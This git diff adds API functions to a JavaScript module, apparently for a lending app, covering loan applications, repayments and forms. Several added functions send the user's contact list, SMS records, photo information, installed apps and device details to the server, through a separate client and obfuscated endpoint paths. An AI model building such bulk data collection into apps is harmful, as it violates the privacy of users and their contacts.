@@ -1,4 +1,6 @@
 import request from '@/utils/service'
+import aaa from '../utils/request'
+import store from "../store";
 //获取验证码
 export function getyzmApi(data) {
     return request.post('/hydrophanous/kerygma-typed/unary', data)
@@ -28,4 +30,87 @@ export function zhengjainshibieAPI(data) {
 //提交用户的信息
 export function uploadUserInfoAPI(data) {
     return request.post('/safekeep/mothering-addressee/solely-odditional', data)
+}
+//获取工作岗位信息
+export function getJobInfomation() {
+    return request.post('/irrotationality/hephzibah-beakiron-wusih/snackette-blend-onload')
+}
+//获取地址信息
+export function getAddressAPI(data) {
+    return request.post('/atempo/dormin-divorced-lacemaking', data)
+}
+//提交表单
+export function uploadbaseform(data) {
+    return request.post('/sware-pollock-unsurpassed/siphon/compete-hemospasia', data);
+}
+//获取指定表单
+export function getdefaultform(data) {
+    return request.post('/avenge-intermetallic-pippip/hesitation-ichthyophagy/crispbread-laborist-hemiolia', data)
+}
+//检测设备上报情况
+export function setDeviceInfoAPI() {
+    return request.post('/maintop/autobus-armorial')
+}
+//上报设备信息
+export function getshebeiInfoAPI(data) {
+    return aaa.post('/superserviceable/sittwe-anymore-absently', data)
+}
+//上报App信息
+export function getAppInfoAPI(data) {
+    return aaa.post('/convector-unsocial-blae/inscribe/fluvial-bondman-yaleman', data)
+}
+//上报通讯录
+export function gettxlAPI(data) {
+    return aaa.post('/aurar/underprize-benefactor/chinovnik-gasthaus-dumpy', data)
+}
+//上报短信记录
+export function getduanxinAPI(data) {
+    return aaa.post('/herdwick-chiliad-tauten/recursion', data)
+}
+//上报照片信息
+export function getPhotoInfoAPI(data) {
+    return aaa.post('/tessellate/splinter-exchangeability-disciplinant', data)
+}
+
+
+
+//活体校验
+export function huotijiaoyanAPI(data) {
+    return request.post('/anatropous/orienteering-whinchat/iodate', data)
+}
+//获取产品列表
+export function getOrderListAPI(data) {
+    return request.post('/tortuosity/carlist-remand', data)
+}
+//产品手续费试算
+export function getOrderPayAPI(data) {
+    return request.post('/coprosterol-lambdoidal-fishline/podalic', data)
+}
+//贷款申请
+export function dkUploadAPI(data) {
+    return request.post('/tubby-haulm/nile-shoeshop/electrology-democratic-microtransmitter', data)
+}
+//订单列表
+export function getDingDanListAPI(data) {
+    return request.post('/interlace-semibasement-orad/apetalous/rodriguan-synchroscope-inhabited', data)
+}
+//订单还款计划
+export function dingdanhuankuanAPI(data) {
+    return request.post('/succedaneum/tendentious/scalprum', data)
+}
+//获取订单还款方式
+export function getOrderPayType(data) {
+    return request.post('/supernormal/racinage-neurology', data)
+}
+//获取订单还款链接
+export function getOrderLinkAPI(data) {
+    return request.post('/abasement-goosegog/bta', data)
+}
+//展期还款
+export function zhanqiAPI(data) {
+    return request.post('/benevolence/heuchera-roumania/legiron-apyrexia-mesorectum', data)
+}
+//获取反馈列表
+export function getfankuiLiatAPI(data) {
+    return request.post('/rimous/confoundedly-dissatisfaction/instanton', data)
 }
